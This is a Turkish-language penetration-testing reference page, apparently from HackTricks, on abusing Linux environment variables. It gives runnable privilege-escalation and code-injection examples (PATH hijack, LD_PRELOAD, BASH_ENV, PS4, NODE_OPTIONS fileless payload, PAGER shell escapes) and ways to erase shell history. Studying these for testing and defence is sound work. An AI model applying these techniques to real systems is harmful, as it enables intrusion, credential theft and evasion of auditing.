# Linux Ortam Değişkenleri

{{#include ../../banners/hacktricks-training.md}}

## Global değişkenler

Global değişkenler **alt süreçler** tarafından devralınır.

Geçerli oturumunuz için global bir değişkeni şöyle oluşturabilirsiniz:

```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```

Bu değişkene mevcut oturumlarınız ve bunların alt süreçleri erişebilir.

Bir değişkeni şu şekilde **kaldırabilirsiniz**:

```bash
unset MYGLOBAL
```

## Yerel değişkenler

**Yerel değişkenlere** yalnızca **geçerli shell/script** tarafından **erişilebilir**.

```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```

## Geçerli değişkenleri listeleme

```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```

`/proc/*/environ` içerikleri **NUL ile ayrılmıştır**, bu nedenle bu varyantları okumak genellikle daha kolaydır:

```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```

Devralınan ortamlar içinde **credentials** veya **ilginç servis yapılandırmaları** arıyorsanız [Linux Post Exploitation](../post-exploitation/README.md) sayfasına da bakın.

## Yaygın değişkenler

Kaynak: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – **X** tarafından kullanılan ekran. Bu değişken genellikle **:0.0** olarak ayarlanır; bu, mevcut bilgisayardaki ilk ekran anlamına gelir.
- **EDITOR** – kullanıcının tercih ettiği metin düzenleyicisi.
- **HISTFILESIZE** – geçmiş dosyasındaki maksimum satır sayısı.
- **HISTSIZE** – kullanıcı oturumunu sonlandırdığında geçmiş dosyasına eklenen satır sayısı.
- **HOME** – ana dizininiz.
- **HOSTNAME** – bilgisayarın ana makine adı.
- **LANG** – mevcut diliniz.
- **MAIL** – kullanıcının posta kuyruğunun konumu. Genellikle **/var/spool/mail/USER**.
- **MANPATH** – kılavuz sayfalarını aramak için kullanılacak dizinlerin listesi.
- **OSTYPE** – işletim sisteminin türü.
- **PS1** – bash'teki varsayılan istem.
- **PATH** – dosyanın göreli veya mutlak yolunu değil, yalnızca adını belirterek çalıştırmak istediğiniz ikili dosyaları içeren tüm dizinlerin yollarını saklar.
- **PWD** – mevcut çalışma dizini.
- **SHELL** – mevcut komut kabuğunun yolu (örneğin, **/bin/bash**).
- **TERM** – mevcut terminal türü (örneğin, **xterm**).
- **TZ** – saat diliminiz.
- **USER** – mevcut kullanıcı adınız.

## Hacking için ilginç değişkenler

Her değişken aynı derecede kullanışlı değildir. Saldırgan bakış açısıyla **arama yollarını**, **başlangıç dosyalarını**, **dinamik bağlayıcı davranışını** veya **denetim/günlük kaydını** değiştiren değişkenlere öncelik verin.

### **HISTFILESIZE**

Bu değişkenin **değerini 0 olarak değiştirin**; böylece **oturumunuzu sonlandırdığınızda** **geçmiş dosyası** (\~/.bash_history) **0 satıra kısaltılır**.

```bash
export HISTFILESIZE=0
```

### **HISTSIZE**

Bu değişkenin **değerini 0 olarak değiştirin**; böylece komutlar **bellekteki geçmişte tutulmaz** ve **geçmiş dosyasına** (\~/.bash_history) yazılmaz.

```bash
export HISTSIZE=0
```

### **HISTCONTROL**

Bu değişkenin **değeri `ignorespace` veya `ignoreboth` olarak ayarlanmışsa**, başına fazladan boşluk eklenen hiçbir komut geçmişe kaydedilmez.

```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```

### **HISTFILE**

**History dosyasını** **`/dev/null`** konumuna yönlendirin veya tamamen unset edin. Bu, genellikle yalnızca history boyutunu değiştirmekten daha güvenilirdir.

```bash
export HISTFILE=/dev/null
unset HISTFILE
```

### http_proxy & https_proxy

İşlemler, **http veya https** üzerinden internete bağlanmak için burada tanımlanan **proxy**’yi kullanır.

```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```

### all_proxy & no_proxy

- `all_proxy`: bunu dikkate alan araçlar/protokoller için varsayılan proxy.
- `no_proxy`: doğrudan bağlanması gereken ana makineler/etki alanları/CIDR'ler için bypass listesi.

```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```

Hem küçük hem de büyük harfli biçimler kullanılabilir; bu, araca bağlıdır (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

Süreçler, **bu ortam değişkenlerinde** belirtilen sertifikalara güvenir. Bu, **`curl`**, **`git`**, Python HTTP istemcileri veya paket yöneticileri gibi araçların saldırganın kontrolündeki bir CA'ya güvenmesini sağlamak için kullanışlıdır (örneğin, bir interception proxy'sini meşru göstermek için).

```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```

### **PATH**

Ayrıcalıklı bir wrapper/script komutları **mutlak yollar kullanmadan** çalıştırıyorsa, `PATH` içindeki **saldırganın kontrolündeki ilk dizin** öncelik kazanır. Bu, `sudo`, cron işleri, shell wrapper’ları ve özel SUID yardımcı araçlarındaki birçok **PATH hijack** tekniğinin temelini oluşturur. `env_keep+=PATH`, zayıf `secure_path` ayarlarını veya `tar`, `service`, `cp`, `python` gibi komutları adlarıyla çağıran wrapper’ları araştırın.

```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```

`PATH`'i kötüye kullanan tam privilege-escalation zincirleri için [Linux Privilege Escalation](linux-privilege-escalation/README.md) sayfasına bakın.

### **HOME & XDG_CONFIG_HOME**

`HOME` yalnızca bir dizin başvurusu değildir: birçok araç `$HOME` veya `$XDG_CONFIG_HOME` içinden **dotfiles**, **plugins** ve **kullanıcı başına yapılandırmaları** otomatik olarak yükler. Ayrıcalıklı bir iş akışı bu değerleri koruyorsa, **config injection** ikili dosya ele geçirmeden daha kolay olabilir.

```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```

İlgi çekici hedefler arasında `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py` ve `.terraformrc` gibi araçlara özgü dosyalar bulunur.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Bu değişkenler **dinamik bağlayıcıyı** etkiler:

- `LD_PRELOAD`: Ek paylaşılan nesnelerin önce yüklenmesini zorlar.
- `LD_LIBRARY_PATH`: Kütüphane arama dizinlerini başa ekler.
- `LD_AUDIT`: Kütüphane yüklemesini ve sembol çözümlemesini izleyen denetçi kütüphanelerini yükler.

Ayrıcalıklı bir komut bu değişkenleri koruyorsa **hooking**, **instrumentation** ve **privilege escalation** için son derece değerlidirler. **secure-execution** modunda (`AT_SECURE`; ör. setuid/setgid/capabilities), yükleyici bu değişkenlerin çoğunu kaldırır veya kısıtlar. Ancak bu erken yükleyici aşamasındaki parser hataları, hedef programdan **önce** çalıştıkları için hâlâ büyük etkiye sahiptir.<sup>[[2]](#references)</sup>

```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```

### **GLIBC_TUNABLES**

`GLIBC_TUNABLES`, glibc'nin erken aşamadaki davranışını değiştirir (örneğin allocator tunable'larını) ve exploit laboratuvarlarında çok kullanışlıdır. **Dynamic loader bu değişkeni çok erken ayrıştırdığı** için güvenlik açısından da önemlidir. 2023'teki **Looney Tunables** hatası, loader'da ayrıştırılan tek bir environment variable'ın SUID programlarına karşı **yerel ayrıcalık yükseltme primitive'i** hâline gelebileceğini hatırlattı.<sup>[[6]](#references)</sup>

CVE-2023-4911 için, **kurulu dağıtım paketinin sürümünü** vendor'ın düzeltilmiş sürümüyle karşılaştırın ve yeni süreçler için gerçekten hangi loader'ın kullanıldığını doğrulayın. Yalnızca upstream sürüm dizgesine güvenmek doğru değildir: Debian, etkilenen parser'ı 2.31 paketine backport ederken bazı dağıtımlar upstream sürüm numarasını değiştirmeden düzeltmeleri backport etti. Ayrıca ayrıcalık geçişinin gerçekleşmesi için kimlik değişimi `NoNewPrivs`, `nosuid` mount'u veya başka bir mitigation tarafından engellenmeyen, ayrıcalıklı bir hedef executable gerekir. Pasif enumeration sırasında bozuk bir `GLIBC_TUNABLES` çökme testini çalıştırmaktan kaçının. Sürüme göre etkilenme durumunu [Ubuntu tracker](https://ubuntu.com/security/CVE-2023-4911), [Debian tracker](https://security-tracker.debian.org/tracker/CVE-2023-4911) ve [Red Hat advisory](https://access.redhat.com/security/cve/cve-2023-4911) üzerinden kontrol edin; Ubuntu'nun [security notice](https://ubuntu.com/security/notices/USN-6409-1) güncellemeden sonra yeniden başlatma gerektiğini de belirtir.

```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```

### **BASH_ENV & ENV**

**Bash** **etkileşimsiz** olarak başlatılırsa, hedef betiği çalıştırmadan önce `BASH_ENV` değerini kontrol eder ve belirtilen dosyayı kaynak olarak çalıştırır. Bash `sh` olarak çağrıldığında veya POSIX tarzı etkileşimli modda çalıştırıldığında `ENV` değişkenine de başvurulabilir. Bu, ortam saldırganın kontrolündeyse bir shell wrapper'ını code execution'a dönüştürmenin klasik bir yoludur.

```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```

Bash, **gerçek/etkin kimlikler farklı olduğunda** bu başlangıç dosyalarını yok sayar; `-p` etkin kimliği korur ancak bu başlangıç dosyalarını etkinleştirmez, dolayısıyla tam davranış wrapper'ın shell'i nasıl başlattığına bağlıdır. Bash'i başlatmadan **önce** `setuid()`/`setgid()` çağıran ayrıcalıklı wrapper'lara dikkat edin: kimlikler yeniden eşleştiğinde Bash, aksi durumda yok sayacağı `BASH_ENV`, `ENV` ve ilgili shell durumuna güvenebilir.<sup>[[1]](#references)</sup>

### **PS4 + SHELLOPTS (xtrace)**

Bash, **xtrace** etkin olarak çalıştığında `PS4`'ü genişletir ve izlenen her komuttan önce yazdırır. `PS4`, prompt gibi genişletildiğinden içindeki bir **command substitution** çalıştırılır. Önemlisi, `xtrace` yalnızca ortamdan `SHELLOPTS=xtrace` dışa aktarılarak etkinleştirilebilir — komut satırında `-x` gerekmez — bu nedenle kurbanın çalıştırdığı herhangi bir Bash script'i code execution'a yol açar.<sup>[[7]](#references)</sup>

```bash
echo 'echo target' > /tmp/victim.sh

# Pure environment-variable injection (no -x flag)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a job is run with debugging enabled
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```

`PS4`, xtrace etkin olana kadar hiçbir şey yapmaz (`SHELLOPTS=xtrace`, `set -x` veya `bash -x`); Bash, `BASH_ENV` gibi ayrıcalıklı/setuid bağlamlarda `SHELLOPTS` değişkenini de kaldırır.

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP, PYTHONINSPECT & PYTHONBREAKPOINT**

Bu değişkenler Python'ın nasıl başlatıldığını değiştirir:

- `PYTHONPATH`: import arama yollarını öne ekler.
- `PYTHONHOME`: standart kütüphane ağacının konumunu değiştirir.
- `PYTHONSTARTUP`: etkileşimli istemden önce bir dosya çalıştırır.
- `PYTHONINSPECT=1`: bir script tamamlandıktan sonra etkileşimli moda geçer.
- `PYTHONBREAKPOINT`: kod `breakpoint()` noktasına ulaştığında çağrılan `package.module.callable` (ve modülü import edilir).<sup>[[8]](#references)</sup>

Bu değişkenler, Python'ı kontrol edilebilir bir ortamla çağıran bakım script'lerine, debugger'lara, shell'lere ve wrapper'lara karşı kullanışlıdır. `python -E` ve `python -I`, tüm `PYTHON*` değişkenlerini yok sayar.

```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode

# PYTHONBREAKPOINT: runs when the target reaches breakpoint()
printf 'import sys\nbreakpoint(*sys.argv[1:])\n' > /tmp/bp.py
PYTHONBREAKPOINT='os.system' python3 /tmp/bp.py 'id'   # requires the code to hit breakpoint()
```

Yakın tarihli gerçek dünya örneklerinden biri, 2024'te Ubuntu/Debian sistemlerinde görülen **needrestart** LPE'siydi: root sahibi tarayıcı, ayrıcalıksız bir sürecin `PYTHONPATH` değerini `/proc/<PID>/environ` üzerinden kopyalıyor ve ardından Python'ı çalıştırıyordu. Yayımlanan exploit, saldırganın kontrolündeki yola `importlib/__init__.so` yerleştiriyordu; böylece Python, yardımcı programın sabit kodlanmış betiği devreye girmeden önce kendi başlatma sürecinde saldırgan kodunu çalıştırıyordu.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl'de de aynı derecede kullanışlı başlangıç değişkenleri vardır:

- `PERL5LIB`: Kütüphane dizinlerini arama yolunun başına ekler.
- `PERL5OPT`: Her `perl` komut satırında yer alıyormuş gibi seçenekler ekler.

Bunlar, hedef betik ilginç bir şey yapmaya başlamadan önce **otomatik modül yüklemeyi** zorlayabilir veya yorumlayıcının davranışını değiştirebilir. Perl, **taint / setuid / setgid** bağlamlarında bu değişkenleri yok sayar; ancak normal root tarafından çalıştırılan wrapper'lar, CI işleri, yükleyiciler ve özel sudoers kuralları için hâlâ önemlidir.

Bir sudo kuralı ortam değişkenlerinin üzerine yazılmasına izin veriyorsa ve ayrıcalıklı komutu sonunda Perl çalıştırıyorsa, `PERL5DB` değişkenini de inceleyin. Perl belgelerine göre `PERL5OPT=-d` hata ayıklayıcıyı başlatır ve `PERL5DB`, Perl yalın bir `-d` seçeneğiyle başladığında hata ayıklayıcı başlatma kodunu sağlar. Yalnızca `PERL5LIB` ve `PERLLIB` değişkenlerini temizlemek bu yolu kapatmaz. Değişkenlerin sudo ve wrapper aşamalarından geçmesi, ayrıca Perl sürecinin bunları taint veya set-ID işlemleri nedeniyle yok saymaması gerekir; envanter çıkarırken ayrıcalıklı yardımcı programı çalıştırmadan tam kuralı ve yürütme zincirini inceleyin. Bkz. [perlrun ortam değişkenleri referansı](https://perldoc.perl.org/perlrun#ENVIRONMENT).

Perl'ün yerleşik [`@INC` arama yolu](https://perldoc.perl.org/perlvar#@INC), ortam değişkenleri korunmasa bile başka bir modül güven sınırıdır. Ayrıcalıklı bir Perl süreci için gerçek bir `use` veya `require` ifadesini; çözümlenen modül adı, arama sırası ve ayrıcalığı daha düşük bir kullanıcının aranan dizinlerden birinde bu modülü oluşturma veya değiştirme olanağıyla birlikte değerlendirin. Tek başına yazılabilir bir kütüphane dizininin varlığı, ayrıcalıklı sürecin buradan kod yükleyeceğini kanıtlamaz.

```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```

### **NODE_OPTIONS**

`NODE_OPTIONS`, ortamı devralan her `node` sürecine **Node.js CLI flags** ekler. Bu nedenle, sonunda Node'u çalıştıran wrappers, CI jobs, Electron yardımcı süreçleri ve sudo kurallarına karşı kullanışlıdır. Saldırı amaçlı en ilgi çekici flags genellikle şunlardır:

- `--require <file>`: hedef script'ten önce bir CommonJS dosyasını yükler.
- `--import <module>`: hedef script'ten önce bir ES module yükler.

Node, `NODE_OPTIONS` içinde bazı tehlikeli flags'leri reddeder; ancak `--require` ve `--import` açıkça kabul edilir ve normal komut satırı argümanlarından **önce** işlenir.<sup>[[4]](#references)</sup>

```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```

#### `data:` URL ile dosyasız preload

Hedefte dosya yazamıyorsanız (salt okunur dosya sistemi, kısıtlı API, serverless runtime vb.) ancak `NODE_OPTIONS` ayarlayabiliyorsanız, `--import` bir `data:text/javascript,` URL'sini kabul eder; böylece payload'ın tamamı ortam değişkeninin içinde taşınır. JavaScript tamamen URL-encoded olmalıdır — Node değeri URL olarak ayrıştırır; bu nedenle kodlanmamış herhangi bir boşluk (veya başka bir karakter) payload'ı keser ve `SyntaxError` hatası verir. Bu, `--import` seçeneğinin `NODE_OPTIONS` izin listesinde bulunduğu Node 20.6+ sürümlerinde çalışır.<sup>[[4]](#references)</sup>

```bash
# fileless proof of execution (note: no raw spaces in the data URL)
NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'

# Real payload, URL-encoded (run a command / exfiltrate env vars)
PAYLOAD=$(python3 - <<'PY'
import urllib.parse
js = "import('child_process').then(cp=>console.log(cp.execSync('id').toString()))"
print("--import data:text/javascript," + urllib.parse.quote(js, safe=""))
PY
)
NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
```

> [!TIP]
> Bu, fonksiyonları Node çalıştıran **managed cloud runtimes** üzerinde `NODE_OPTIONS` denetimini RCE'ye dönüştürmenin yaygın bir yoludur. Örneğin, yalnızca bir Lambda'nın yapılandırmasını değiştirebilen (`lambda:UpdateFunctionConfiguration`, `iam:PassRole` yok, kod güncellemesi yok) bir saldırgan, fonksiyon içinde kod çalıştırmak ve execution role kimlik bilgilerini çalmak için `NODE_OPTIONS=--import data:text/javascript,<payload>` enjekte edebilir. Enjekte edilen modül, handler'dan **önce** çalışır; handler da sonrasında normal şekilde çalışmaya devam eder.

`NODE_OPTIONS` değerini dolaylı olarak ayarlayan uzak gadget chain'ler için (örneğin, RCE'ye yol açan prototype pollution), [bu diğer sayfaya](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md) bakın.

### **RUBYLIB & RUBYOPT**

Ruby de aynı sınıfta başlangıç suistimali olanağı sunar:

- `RUBYLIB`: Dizinleri Ruby'nin load path'inin başına ekler.
- `RUBYOPT`: Her `ruby` çağrısına `-r` gibi komut satırı seçenekleri enjekte eder.

```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```

2024 **needrestart** açıkları, bunun yalnızca bir lab numarası olmadığını gösterdi: `PYTHONPATH` kötüye kullanımına açık olan aynı root sahipli yardımcı, saldırganın kontrolündeki `RUBYLIB` ile Ruby çalıştırmaya ve saldırganın dizinindeki `enc/encdb.so` dosyasını yüklemeye de zorlanabiliyordu.<sup>[[3]](#references)</sup>

### **VIMINIT & EXINIT**

Vim/Neovim, normal başlangıç sırasında `VIMINIT` (veya onun yedeği olan `EXINIT`) içindeki Ex komutlarını çalıştırır. Ex komutları arasında `:!cmd` ve `:call system(...)` bulunur; bu nedenle değişkeni kontrol etmek, kurban Vim'i her açtığında (root ile `sudo vim`, `crontab -e`, `visudo`, `$EDITOR`'ü başlatan `git`/`less` vb.) kod yürütülmesini sağlar.<sup>[[9]](#references)</sup>

```bash
echo hi > /tmp/victim.txt
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
test -e /tmp/vim-executed && echo 'VIMINIT executed'
```

Batch mode (`vim -es`/`-Es`) bu değişkenleri atlar, ancak normal bir etkileşimli başlangıç bunları çalıştırır.

### **PowerShell (pwsh): PSModulePath, DOTNET_STARTUP_HOOKS & CLR profiler**

PowerShell Core (`pwsh`) Linux/macOS (ve Windows) üzerinde çalışır ve bir **.NET uygulamasıdır**; bu nedenle birkaç ortam değişkeni, devralınan bir ortamla yapılan tüm `pwsh` çağrılarını kod yürütmeye dönüştürebilir. Bu, `pwsh` çalıştıran cron/systemd işleri, CI runner'ları ve ayrıcalıklı wrapper'lara karşı kullanışlıdır.

- `PSModulePath`: PowerShell, bu listedeki her dizinde `.psd1`/`.psm1` modüllerini yinelemeli olarak arar ve dışa aktardığı bir komuta ilk kez başvurulduğunda modülü **otomatik olarak yükler**. Bir dizini listenin başına ekleyin; modülünüzün üst düzey kodu içe aktarma sırasında çalışır. Çözümleme sırası *Alias → Function → Cmdlet* olduğundan, dışa aktarılan bir işlev kurbanın çağırdığı yerleşik bir cmdlet'i bile gölgeleyebilir.<sup>[[10]](#references)</sup>
- `XDG_CONFIG_HOME`: başlangıçta çalıştırılan `powershell/Microsoft.PowerShell_profile.ps1` dosyasının konumunu değiştirir (`-NoProfile` kullanılmadığı sürece).
- `DOTNET_STARTUP_HOOKS`: `Main`'den önce `StartupHook.Initialize()` metodu çalıştırılan yönetilen assembly (tüm .NET uygulamalarında ortaktır).
- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so`: CLR profiling API, başlangıçta saldırganın kitaplığını sürece yükler (yol değişkenleri kayıt defterine göre önceliklidir; `DOTNET_*` daha yeni diğer addır). Windows PowerShell 5.1'de (.NET Framework) `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH` kullanın. MITRE ATT&CK T1574.012.<sup>[[11]](#references)</sup>

```bash
# PSModulePath module auto-load hijack
mkdir -p /tmp/evil/Hijack
printf 'New-Item -ItemType File /tmp/ps-mod-exec -Force|Out-Null\nfunction Invoke-Report{}\nExport-ModuleMember -Function Invoke-Report\n' > /tmp/evil/Hijack/Hijack.psm1
printf "@{ModuleVersion='1.0';RootModule='Hijack.psm1';FunctionsToExport=@('Invoke-Report')}\n" > /tmp/evil/Hijack/Hijack.psd1
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/ps-mod-exec && echo 'PSModulePath auto-load executed'
```

Windows'ta `PSExecutionPolicyPreference=Bypass`, ek olarak "unsigned scripts blocked" korumasını kaldırarak yerleştirilmiş bir profile/module'ün gerçekten çalışmasını sağlar. Tüm PoC'ler için özel sayfaya bakın:

{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-powershell-applications-injection.md
{{#endref}}

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Bazı araçlar ortam değişkeninden yalnızca bir yolu okumaz; değeri bir **shell**'e, **editör**e veya **girdi ön işlemcisine** iletir. Bu nedenle ayrıcalıklı bir wrapper `git`, `man`, `less` veya benzer metin görüntüleyicileri çalıştırdığında aşağıdaki değişkenler özellikle ilgi çekicidir:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: pager komutunu seçer.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: genellikle argümanlarla birlikte editör komutunu seçer.
- `LESSOPEN`, `LESSCLOSE`: `less` bir dosyayı açtığında çalışan ön/son işlemcileri tanımlar.

```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```

Git ayrıca `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>` ve `GIT_CONFIG_VALUE_<n>` aracılığıyla diske dokunmadan **yalnızca ortam değişkenleriyle yapılandırma enjeksiyonunu** destekler:

```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```

Post-exploitation açısından, devralınan ortamların genellikle **credentials**, **proxy settings**, **service tokens** veya **cloud keys** içerdiğini de unutmayın. `/proc/<PID>/environ` ve `systemd` `Environment=` aramaları için [Linux Post Exploitation](../post-exploitation/README.md) sayfasına bakın.

### PS1

Prompt'unuzun görünümünü değiştirin.

[**Bu bir örnektir**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: Bu bir örnektir](<../images/image (897).png>)

Normal kullanıcı:

![PERL5OPT & PERL5LIB - PS1: Arka plana alınmış bir, iki ve üç iş](<../images/image (740).png>)

Arka plana alınmış bir, iki ve üç iş:

![PERL5OPT & PERL5LIB - PS1: Arka plana alınmış bir, iki ve üç iş](<../images/image (145).png>)

Bir arka plan işi, duraklatılmış bir iş ve son komut doğru şekilde tamamlanmadı:

![PERL5OPT & PERL5LIB - PS1: Bir arka plan işi, duraklatılmış bir iş ve son komut doğru şekilde tamamlanmadı](<../images/image (715).png>)

## References

- [1] [GNU Bash Manual - Bash Başlangıç Dosyaları](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - needrestart'te LPE'ler](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Node.js CLI belgeleri - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Yaygın ortam değişkenleri - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - glibc'nin ld.so bileşeninde yerel ayrıcalık yükseltme - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
- [7] [GNU Bash Manual - Bash Değişkenleri (`PS4`) ve Set Yerleşik Komutu (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [8] [PEP 553 - Yerleşik breakpoint() ve PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [9] [Vim belgeleri - starting.txt (`VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
- [10] [about_PSModulePath ve PowerShell modüllerinin otomatik yüklenmesi](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [11] [.NET hata ayıklama ve profil oluşturma yapılandırma ayarları (`CORECLR_`/`DOTNET_`/`COR_` profiler değişkenleri)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
{{#include ../../banners/hacktricks-training.md}}
